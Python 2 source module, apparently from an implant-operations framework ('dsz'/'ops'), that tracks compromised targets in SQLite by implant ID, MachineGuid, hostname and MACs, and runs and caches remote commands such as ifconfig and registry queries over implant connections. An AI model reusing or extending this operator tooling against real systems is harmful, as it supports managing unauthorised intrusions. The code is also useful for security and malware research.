
from __future__ import print_function
from __future__ import division
import dsz
import dsz.ui
import dsz.script
import ops
import ops.cmd
import ops.db
import ops.env
import ops.menu
import os
import os.path
import sqlite3
import uuid
import shutil
from datetime import datetime, timedelta
from ops.networking.ifconfig import IFCONFIG_TAG, MAX_CACHE_SIZE
ALL_TARGETS = []
CONFIDENCE_MATCH_THRESHOLD = 1

def getAllProjectNames():
    retval = []
    for projdir in os.listdir(ops.BASELOGDIR):
        fullprojdir = os.path.join(ops.BASELOGDIR, projdir)
        if (os.path.isdir(fullprojdir) and (projdir.find('.') < 0)):
            retval.append(projdir.lower())
    return retval

def getAllProjectLogdirs():
    retval = []
    for projdir in getAllProjectNames():
        retval.append(os.path.join(ops.BASELOGDIR, projdir))
    return retval

def getAllProjectDBs():
    retval = []
    for fullprojdir in getAllProjectLogdirs():
        dbfile = os.path.join(fullprojdir, 'project.db')
        if (not os.path.exists(dbfile)):
            create_new_pdb(dbfile)
        retval.append(dbfile)
    return retval

def getAllTargets(project=''):
    global ALL_TARGETS
    if (ALL_TARGETS == []):
        retval = []
        projlist = None
        if (project == ''):
            projlist = getAllProjectNames()
        else:
            projlist = [project]
        retval = []
        for proj in projlist:
            proj_obj = Project(proj)
            with get_pdb(proj) as pdb:
                curs = pdb.execute('SELECT * FROM targets')
                for row in curs:
                    retval.append(Target(proj_obj, dbrow=row))
        ALL_TARGETS = retval
    return ALL_TARGETS

def matchTarget(**evidence):
    for key in ['implant_id', 'crypto_guid', 'hostname']:
        if (key not in evidence):
            evidence[key] = None
        elif (type(evidence[key]) == str):
            evidence[key] = unicode(evidence[key], 'utf_8')
    if ('macs' not in evidence):
        evidence['macs'] = []
    targets = getAllTargets()
    candidates = []
    for targ in targets:
        if ((targ.implant_id == evidence['implant_id']) and (targ.implant_id != '0x0000000000000000') and (evidence['implant_id'] is not None)):
            candidates.append({'target': targ})
        elif ((targ.crypto_guid == evidence['crypto_guid']) and (targ.crypto_guid is not None)):
            candidates.append({'target': targ})
        elif ((targ.hostname == evidence['hostname']) and (targ.hostname != '') and (evidence['hostname'] is not None)):
            candidates.append({'target': targ})
        elif (evidence['macs'] is not None):
            for mac in targ.macs:
                if (mac.lower() in evidence['macs']):
                    candidates.append({'target': targ})
    max_confidence = (len(evidence) + len(evidence['macs']))
    for cand in candidates:
        confidence = 0
        for i in (((evidence['implant_id'] != '0x0000000000000000') and (cand['target'].implant_id == evidence['implant_id'])), (cand['target'].crypto_guid == evidence['crypto_guid']), (cand['target'].hostname == evidence['hostname'])):
            if i:
                confidence += 1
        for i in evidence['macs']:
            if (i.lower() in cand['target'].macs):
                confidence += 1
        if (len(evidence['macs']) == len(cand['target'].macs)):
            confidence += 1
        cand['confidence'] = (confidence / max_confidence)
    candidates.sort((lambda x, y: (- cmp(x['confidence'], y['confidence']))))
    return candidates

def getTarget(cpaddr=None, forcenew=False, forceproj=None):
    if (cpaddr is None):
        cpaddr = dsz.script.Env['target_address']
    targ_id = (ops.env.get('OPS_TARGET_ID', addr=cpaddr) if (not forcenew) else None)
    if (targ_id is not None):
        proj = Project(ops.env.get('OPS_PROJECTNAME', addr=cpaddr))
        with proj.pdb as pdb:
            curs = pdb.execute('SELECT * FROM targets WHERE target_id = ?', (targ_id,))
            targrow = curs.fetchone()
            if (targrow is not None):
                return Target(proj, dbrow=targrow)
            else:
                raise Exception('Have a target ID, but data not in database, something is wrong')
    else:
        ifconfig_cmd = ops.cmd.getDszCommand('ifconfig')
        ifconfig_cmd.dszdst = cpaddr
        ifconfig_result = ifconfig_cmd.execute()
        hostname = ifconfig_result.fixeddataitem.hostname
        macs = []
        for iface in ifconfig_result.interfaceitem:
            if ((iface.address != '') and (iface.type.upper() != 'LOCAL') and (not iface.type.upper().startswith('TUNNEL'))):
                macs.append(iface.address.lower())
        crypto_guid_cmd = ops.cmd.getDszCommand('registryquery', hive='L', key='software\\microsoft\\cryptography', value='MachineGuid', wow64=(ops.env.get('_OS_64BIT').upper() == 'TRUE'))
        crypto_guid_cmd.dszdst = cpaddr
        crypto_guid_result = crypto_guid_cmd.execute()
        if (crypto_guid_cmd.success and (len(crypto_guid_result.key) > 0) and (len(crypto_guid_result.key[0].value) > 0)):
            crypto_guid = crypto_guid_result.key[0].value[0].value
        else:
            crypto_guid = None
        implant_id = ops.env.get('_PC_ID', addr=cpaddr)
        mycandidates = (matchTarget(implant_id=implant_id, crypto_guid=crypto_guid, hostname=hostname, macs=macs) if (not forcenew) else None)
        mytarg = None
        if (len(mycandidates) == 0):
            mytarg = None
        elif (len(filter((lambda x: (x['confidence'] >= CONFIDENCE_MATCH_THRESHOLD)), mycandidates)) == 1):
            mytarg = mycandidates[0]['target']
        else:
            print('Showing you what we know so you can make a good decision in the menu below')
            try:
                print((u'crypto_guid: %s' % crypto_guid))
                print((u'hostname: %s' % hostname))
                print((u'macs: %s' % macs))
                print((u'implant_id: %s' % implant_id))
            except:
                print('Well, I wanted to show you, but some kind of funky encoding issue has destroyed me')
            menu = ops.menu.Menu()
            menu.set_heading('Below match threshold or multiple matches. You must choose. Choose wisely.')
            for cand in mycandidates:
                menu.add_option(('(Confidence: %s) %s / %s / PC ID %s / %s / MACS: %s' % (cand['confidence'], cand['target'].project.name, cand['target'].hostname, cand['target'].implant_id, cand['target'].crypto_guid, cand['target'].macs)))
            result = menu.execute(menuloop=False, exit='None of these - create a new target db')
            if (result['selection'] == 0):
                mytarg = None
            else:
                mytarg = mycandidates[(result['selection'] - 1)]['target']
        if (mytarg is None):
            if (forceproj is not None):
                projname = forceproj
            else:
                projnames = getAllProjectNames()
                if (len(projnames) == 1):
                    projname = projnames[0]
                else:
                    ops.warn('This looks like a new target, and I have no idea where to put it.')
                    menu = ops.menu.Menu()
                    for i in projnames:
                        menu.add_option(i)
                    result = menu.execute(menuloop=False, exit='Input project name manually')
                    if (result['selection'] == 0):
                        sure = False
                        while (not sure):
                            projname = dsz.ui.GetString('Enter project name: ')
                            print(('You entered: %s' % projname))
                            sure = dsz.ui.Prompt('Are you absolutely sure this is correct?')
                    else:
                        projname = projnames[(result['selection'] - 1)]
            projectpath = os.path.join(ops.BASELOGDIR, projname, 'targetdbs')
            if (not os.path.exists(projectpath)):
                os.makedirs(projectpath)
            proj = Project(projname.lower())
            mytarg = proj.add_target(implant_id=implant_id, crypto_guid=crypto_guid, hostname=hostname, macs=macs)
        ops.env.set('OPS_TARGET_ID', mytarg.target_id, addr=cpaddr)
        if (mytarg.project != Project()):
            ops.env.set('OPS_PROJECTNAME', mytarg.project.name, addr=cpaddr)
        mytarg.implant_id = implant_id
        mytarg.crypto_guid = crypto_guid
        mytarg.hostname = hostname
        mytarg.macs = macs
        mytarg.save(mytarg.project.pdb)
        tdb = ops.db.get_tdb(mytarg.target_id)
        tdb.save_ops_object(ifconfig_result, tag=IFCONFIG_TAG)
        tdb.truncate_cache_size_bytag(tag=IFCONFIG_TAG, maxsize=MAX_CACHE_SIZE)
        return mytarg

def getTargetID(cpaddr=None):
    if (cpaddr is None):
        cpaddr = dsz.script.Env['target_address']
    targ_id = ops.env.get('OPS_TARGET_ID', addr=cpaddr)
    if (targ_id is not None):
        return targ_id
    connection_guid = ops.env.get('_CONNECTION_GUID', addr=cpaddr)
    with ops.db.get_voldb() as voldb:
        curs = voldb.execute('SELECT * FROM cpconnection WHERE cpaddr = ? AND connection_guid = ?', [cpaddr, connection_guid])
        for row in curs:
            ops.env.set('OPS_TARGET_ID', row['target_id'], addr=cpaddr)
            return row['target_id']
        mytarg = getTarget(cpaddr)
        voldb.execute('INSERT INTO cpconnection (cpaddr, connection_guid, target_id) VALUES (?, ?, ?)', (cpaddr, connection_guid, mytarg.target_id))
        ops.env.set('OPS_TARGET_ID', mytarg.target_id, addr=cpaddr)
        return mytarg.target_id
    return None

def getCPAddresses(targetID=None):
    if (targetID is None):
        targetID = getTargetID()
    with ops.db.get_voldb() as voldb:
        curs = voldb.execute('SELECT * FROM cpconnection WHERE target_id = ?', [targetID])
        retval = []
        for row in curs:
            retval.append(row['cpaddr'])
        return retval

def getActiveCPAddresses(targetID=None):
    if (targetID is None):
        targetID = getTargetID()
    addrs = ops.cmd.quickrun('addresses')
    active_addrs = map((lambda x: x.address), addrs.remote)
    with ops.db.get_voldb() as voldb:
        curs = voldb.execute('SELECT * FROM cpconnection WHERE target_id = ?', [targetID])
        retval = []
        for row in curs:
            if ((row['cpaddr'] in active_addrs) and (row['cpaddr'] not in retval)):
                retval.append(row['cpaddr'])
        return retval

def selectBestCPAddress(targetID=None, reason=''):
    cpaddrs = getActiveCPAddresses(targetID)
    if (len(cpaddrs) == 0):
        raise Exception('No active CP addresses for this target, cannot run command')
    elif (len(cpaddrs) > 1):
        cpaddrlist = ','.join(cpaddrs)
        addr = ''
        default = ''
        if (ops.TARGET_ADDR in cpaddrs):
            default = ops.TARGET_ADDR
        while (addr not in cpaddrs):
            ops.warn(('A script wishes to "%s" on a target to which you have multiple connections (%s)' % (reason, cpaddrlist)))
            addr = dsz.ui.GetString('Please enter the one you wish to use', default)
        return addr
    else:
        return cpaddrs[0]

def get_pdb(project=None):
    if (project is None):
        project = ops.env.get('OPS_PROJECTNAME')
    projdbfile = os.path.join(ops.BASELOGDIR, project, 'project.db')
    if (not os.path.exists(projdbfile)):
        prepprojdbfile = os.path.join(ops.PREPS, project, 'project.db')
        if (os.path.exists(prepprojdbfile) and (os.stat(prepprojdbfile).st_size > 0)):
            shutil.copy(prepprojdbfile, projdbfile)
        else:
            create_new_pdb(projdbfile, project)
    retval = ops.db.Database(projdbfile)
    retval.connection.row_factory = sqlite3.Row
    return retval

def create_new_pdb(projdbfile, projname):
    with ops.db.Database(projdbfile) as pdb:
        pdb.execute('CREATE TABLE project (proj_name)')
        pdb.execute('INSERT INTO project (proj_name) VALUES(?)', [projname])
        pdb.execute('CREATE TABLE targets (target_id UNIQUE NOT NULL, target_name UNIQUE, implant_id, crypto_guid, hostname)')
        pdb.execute('CREATE TABLE macs (frn_target_id, mac)')

def generic_cache_get(command, cache_tag='', cache_size=2, maxage=timedelta(seconds=0), targetID=None, use_volatile=False, return_fails=False):
    defid = False
    if (targetID is None):
        defid = True
        targetID = getTargetID()
    if use_volatile:
        tdb = ops.db.get_voldb()
    else:
        tdb = ops.db.get_tdb(targetID)
    if ((cache_tag != '') and (cache_tag is not None)):
        lastkey = tdb.load_ops_object_bytag(tag=cache_tag, targetID=targetID)
        if (len(lastkey) > 0):
            lastkey = lastkey[(-1)]
            if (lastkey.dszobjage < maxage):
                if ((not return_fails) and (lastkey.commandmetadata.status != 0)):
                    raise ops.cmd.OpsCommandException(('Command %s did not execute properly, returned an error' % command))
                return lastkey
    if (command is None):
        return None
    if (((command.dszdst is None) or (command.dszdst == '')) and ((not defid) or (targetID != ops.TARGET_ID))):
        command.dszdst = selectBestCPAddress(targetID, ('run %s' % command))
    if command.dszbackground:
        import multiprocessing
        command.dszbackground = False
        bgproc = multiprocessing.Process(target=generic_cache_get, args=(command, cache_tag, cache_size, maxage, targetID, use_volatile, return_fails))
        bgproc.start()
        return None
    result = command.execute()
    if ((result is not None) and (cache_tag != '') and (cache_tag is not None)):
        tdb.save_ops_object(result, tag=cache_tag, targetID=targetID)
        tdb.truncate_cache_size_bytag(tag=cache_tag, maxsize=cache_size, target_id=targetID)
    if (result is None):
        raise ops.cmd.OpsCommandException(('Command %s failed to execute' % command))
    elif ((not return_fails) and (result.commandmetadata.status != 0) and (not command.dszbackground)):
        raise ops.cmd.OpsCommandException(('Command %s did not execute properly, returned an error' % command))
    return result

def start_monitor(mon_cmd, mon_display=False, cache_tag='', save_delay=60, cache_size=1, targetID=None, use_volatile=True):
    if (targetID is None):
        targetID = getTargetID()
    if (targetID != ops.env.get('OPS_TARGET_ID')):
        mon_cmd.dszdst = selectBestCPAddress(reason=str(mon_cmd))
    wrap_cmd = mon_cmd
    isrunningmon = (len(find_monitor_commands(mon_cmd, targetID)) > 0)
    if (not isrunningmon):
        print(('Staring a monitor with %s' % mon_cmd))
        wrap_cmd.execute()

def find_monitor_commands(mon_cmd, targetID=None):
    if (targetID is None):
        targetID = getTargetID()
    target_addrs = getCPAddresses(targetID)
    goodwords = [str(mon_cmd)]
    return ops.cmd.get_filtered_command_list(cpaddrs=target_addrs, isrunning=True, goodwords=goodwords, badwords=[])

class Project(object, ):

    def __init__(self, name='', **kwargs):
        if (name == ''):
            if (ops.env.get('OPS_PROJECTNAME') is not None):
                self.name = ops.env.get('OPS_PROJECTNAME')
            else:
                self.name = 'UNKNOWN'
        else:
            self.name = name
        self.logdir = os.path.join(ops.BASELOGDIR, self.name)
        if (not os.path.exists(self.logdir)):
            os.makedirs(self.logdir)
        self.targets = None
        for key in kwargs:
            self.__setattr__(key, kwargs[key])

    def add_target(self, **targ_options):
        if ('target_object' in targ_options):
            newtarg = targ_options['target_object']
        else:
            newtarg = Target(self, **targ_options)
        newtarg.save(self.pdb)
        self.targets.append(newtarg)
        return newtarg

    def remove_target(self, target_object):
        with self.pdb as pdb:
            curs = pdb.execute('DELETE FROM targets WHERE target_id = :targetid', {'targetid': target_object.target_id})
        self.__targets = None

    def __getName(self):
        return self.__name

    def __setName(self, value):
        self.__name = value
    name = property(__getName, __setName)

    def __getProjectDB(self):
        return get_pdb(self.name)
    pdb = property(__getProjectDB)

    def __getTargets(self):
        if (self.__targets is None):
            self.__targets = list()
            with self.pdb as pdb:
                curs = pdb.execute('SELECT * FROM targets')
                for row in curs:
                    self.__targets.append(Target(project=self, dbrow=row))
        return self.__targets

    def __setTargets(self, value):
        self.__targets = value
    targets = property(__getTargets, __setTargets)

class Target(object, ):

    def __init__(self, project, dbrow=None, **kwargs):
        self.project = project
        for key in ['target_id', 'implant_id', 'crypto_guid', 'hostname', 'target_name']:
            if (dbrow is not None):
                if (type(dbrow[key]) == str):
                    self.__setattr__(key, unicode(dbrow[key], 'utf_8'))
                else:
                    self.__setattr__(key, dbrow[key])
            elif (key in kwargs):
                if (type(kwargs[key]) == str):
                    self.__setattr__(key, unicode(kwargs[key], 'utf_8'))
                else:
                    self.__setattr__(key, kwargs[key])
            else:
                self.__setattr__(key, None)
        self.macs = None
        if ('macs' in kwargs):
            self.macs = list()
            for mac in kwargs['macs']:
                if (mac not in ['00-00-00-00-00-00-00-e0', '']):
                    self.macs.append(mac)
        if (self.target_id is None):
            self.target_id = str(uuid.uuid4())
            self.save(self.project.pdb)

    def save(self, pdb):
        try:
            pdb.connection.execute('INSERT INTO targets(target_id, implant_id, crypto_guid, hostname, target_name) VALUES (?, ?, ?, ?, ?)', (self.target_id, self.implant_id, self.crypto_guid, self.hostname, self.target_name))
        except (sqlite3.OperationalError, sqlite3.IntegrityError):
            pdb.connection.execute('UPDATE targets SET implant_id = ?, crypto_guid = ?, hostname = ?, target_name = ? WHERE target_id = ?', (self.implant_id, self.crypto_guid, self.hostname, self.target_name, self.target_id))
        pdb.connection.execute('DELETE FROM macs WHERE frn_target_ID = ?', (self.target_id,))
        for mac in self.macs:
            pdb.connection.execute('INSERT OR IGNORE INTO macs (frn_target_id, mac) VALUES (?, ?)', (self.target_id, mac))
        pdb.connection.commit()

    def move_to_project(self, newproject):
        if (type(newproject) in [str, unicode]):
            newproject = Project(newproject)
        oldproject = self.project
        oldfile = ops.db.find_target_db_filename(self.target_id, oldproject.name)
        newfile = ops.db.find_target_db_filename(self.target_id, newproject.name)
        oldproject.remove_target(self)
        shutil.move(oldfile, newfile)
        self.project = newproject
        self.project.add_target(target_object=self)
        self.save(self.project.pdb)

    def __getmacs(self):
        if (self.__macs is None):
            self.__macs = list()
            with self.project.pdb as pdb:
                curs = pdb.execute('SELECT * FROM macs WHERE frn_target_ID = ?', [self.target_id])
                for row in curs:
                    self.macs.append(row['mac'])
        return self.__macs

    def __setmacs(self, value):
        self.__macs = value
    macs = property(__getmacs, __setmacs)

    def __getTargetDB(self):
        return ops.db.get_tdb(self.target_id, self.project.name)

class MultipleTargetIDException(Exception, ):

    def __init__(self, candidates=None, *args, **kwargs):
        self.candidates = candidates
        Exception.__init__(self, *args, **kwargs)